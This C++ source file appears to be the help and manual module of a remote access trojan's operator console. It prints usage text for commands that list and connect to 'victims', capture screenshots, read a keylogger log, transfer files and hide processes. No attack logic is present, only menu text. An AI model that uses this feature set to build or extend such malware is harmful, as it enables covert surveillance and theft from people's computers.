#include "stdafx.h"
#include "manual.h"

enum menu_items_man { help, man, list, connect, disconnect, user, ps, scp, screenshot, keylogger, phide, pop, UNKNOWN };

struct items_man
{
	char *name;
	enum menu_items_man id;
} items_list[] = {
	{ "help", help },
{ "man", man },
{ "list", list },
{ "connect", connect },
{ "disconnect", disconnect },
{ "user", user },
{ "ps", ps },
{ "scp", scp },
{ "screenshot", screenshot },
{ "keylogger", keylogger },
{ "phide", phide },
{ "pop", pop },
};


manual::manual()
{
}


manual::~manual()
{
}

void manual::showHelp() {
	std::cout << "\t$help - show this page" << std::endl <<
		"\t$list - list all victims" << std::endl <<
		"\t$connect - connect to victim" << std::endl <<
		"\t$disconnect - disconnect from victim" << std::endl <<
		"\t$user - get info on connected victim" << std::endl <<
		"\t$ps - show running processes on connected victim" << std::endl <<
		"\t$scp - download/upload files in connected victim" << std::endl << 
		"\t$screenshot - get screensoht from connected victim" << std::endl << 
		"\t$keylogger - get keylogger log" << std::endl <<
		"\t$phide - hide process by id" << std::endl <<
		"\t$pop - pop msg box with text" << std::endl <<
		"\t$exit - terminate" << std::endl;
}
bool manual::showMan(const char* arg) {
	enum menu_items_man requestedOperation;
	struct items_man *choice = NULL;
	int i = 0;

	for (i = 0, choice = NULL; i < sizeof items_list / sizeof(struct items_man); i++)
	{
		if (strcmp(arg, items_list[i].name) == 0)
		{
			choice = items_list + i;
			break;
		}
	}
	requestedOperation = choice ? choice->id : UNKNOWN;
	switch (requestedOperation) {
	case help:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\thelp - reference for available tools" << std::endl;
		std::cout << "USAGE\t $help" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case man:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tman - an interface to the on-line refernce manuals" << std::endl;
		std::cout << "USAGE\t $man tool" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case list:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tlist - display information of all victims" << std::endl;
		std::cout << "USAGE\t $list" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case connect:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tconnect - connect and control victim" << std::endl;
		std::cout << "USAGE\t $connect ip" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case disconnect:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tdisconnect - disconnect from current victim" << std::endl;
		std::cout << "USAGE\t $disconnect" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case user:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tuser - show connected victim user information" << std::endl;
		std::cout << "USAGE\t $user" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case ps:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tps - show connected victim processes information" << std::endl;
		std::cout << "USAGE\t $ps" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case scp:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tscp - download/upload files from connected victim" << std::endl;
		std::cout << "USAGE\t Upload $scp localFile remoteFile" << std::endl << "USAGE\t Download $scp @remoteFile localFile" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case screenshot:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tscreenshot - take screenshot from connected victim" << std::endl;
		std::cout << "USAGE\t$screenshot" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case keylogger:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tkeylogger - show keylogger log from connected victim" << std::endl;
		std::cout << "USAGE\t$keylogger" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case pop:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tpop - pop message box in connected victim" << std::endl;
		std::cout << "USAGE\t$pop msg" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case phide:
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		std::cout << "NAME\tphide - hide process by pid in connected victim" << std::endl;
		std::cout << "USAGE\t$phide pid" << std::endl;
		std::cout << "MAN ver1.0\t\tManual pager utils\t\tMAN ver1.0" << std::endl;
		break;
	case UNKNOWN:
		return false;
	}
	return true;
}
